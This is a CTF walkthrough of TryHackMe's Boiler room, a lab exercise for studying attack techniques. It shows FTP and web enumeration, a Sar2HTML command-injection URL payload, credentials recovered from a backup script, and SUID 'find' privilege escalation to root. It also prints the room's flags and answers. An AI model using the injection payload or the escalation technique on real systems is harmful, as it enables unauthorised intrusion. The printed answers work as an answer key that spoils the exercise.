# Boiler CTF

Intermediate level CTF

[Boiler CTF](https://tryhackme.com/room/boilerctf2)

## Topic's

- FTP Enumeration
- Network Enumeration
- Web Enumeration
- Exploitation Joomle Sar2HTML 3.2.1
- Stored Passwords & Keys
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Questions #1

Intermediate level CTF. Just enumerate, you'll get there.

1. File extension after anon login

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ ftp 10.10.57.168
Connected to 10.10.57.168.
220 (vsFTPd 3.0.3)
Name (10.10.57.168:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (87.1720 kB/s)
ftp> pwd
257 "/" is the current directory
ftp> cd /home
550 Failed to change directory.
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
257 "/" is the current directory
ftp> exit
221 Goodbye.
kali@kali:~/CTFs/tryhackme/Boiler CTF$ cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
kali@kali:~/CTFs/tryhackme/Boiler CTF$ cat .info.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

`txt`

2. What is on the highest port?

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ sudo nmap -sS -sC -sV -O -p- 10.10.57.168Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 14:07 CEST
Nmap scan report for 10.10.57.168
Host is up (0.056s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-trane-info: Problem with XML parsing of /evox/about
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/7%OT=21%CT=1%CU=42115%PV=Y%DS=2%DC=I%G=Y%TM=5F7DAFE
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=105%GCD=1%ISR=107%TI=Z%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M50
OS:8NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC
OS:=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.41 seconds
```

`SSH`

1. What's running on port 10000?

- [https://10.10.57.168:10000/](https://10.10.57.168:10000/)

`Webmin`

2. Can you exploit the service running on that port? (yay/nay answer)

`nay`

3. What's CMS can you access?

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.57.168/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.57.168/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 13:36:23 Starting gobuster
===============================================================
/manual (Status: 301)
/joomla (Status: 301)
/server-status (Status: 403)
Progress: 105022 / 220561 (47.62%)^C
[!] Keyboard interrupt detected, terminating.
```

`joomla`

4. Keep enumerating, you'll know when you find it.

`No answer needed`

5. The interesting file name in the folder?

- [http://10.10.57.168/joomla/\_files/](http://10.10.57.168/joomla/_files/)

`VjJodmNITnBaU0JrWVdsemVRbz0K`

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d
Whopsie daisy
```

- [http://10.10.57.168/joomla/\_test/](http://10.10.57.168/joomla/_test/)

`sar2html `

- [Sar2HTML 3.2.1 - Remote Command Execution](https://www.exploit-db.com/exploits/47204)

`http://<ipaddr>/index.php?plot=;<command-here>`

- [http://10.10.57.168/joomla/\_test/index.php?plot=;ls%20-la](http://10.10.57.168/joomla/_test/index.php?plot=;ls%20-la)

`superduperp@$$`

`log.txt`

## Task 2 Questions #2

You can complete this with manual enumeration, but do it as you wish

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ ssh basterd@10.10.57.168 -p 55007
basterd@10.10.57.168's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
```

1. Where was the other users pass stored(no extension, just the name)?

```
$ ls -la
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
$ /bin/bash
basterd@Vulnerable:~$ cat backup.sh
```

```sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi
    done


else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

`backup`

2. user.txt

```
basterd@Vulnerable:~$ su stoner
Password:
stoner@Vulnerable:/home/basterd$ cd ~
stoner@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

`You made it till here, well done.`

3. What did you exploit to get the privileged user?

```
stoner@Vulnerable:~$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
```

`-r-sr-xr-x 1 root root 232196 Feb 8 2016 /usr/bin/find`

4. root.txt

```
stoner@Vulnerable:~$ find . -exec chmod -R 777 /root \;
stoner@Vulnerable:~$ ls -l /root
total 4
-rwxrwxrwx 1 root root 29 Aug 21  2019 root.txt
stoner@Vulnerable:~$ cat /root/root.txt
It wasn't that hard, was it?
stoner@Vulnerable:~$
```

`It wasn't that hard, was it?`
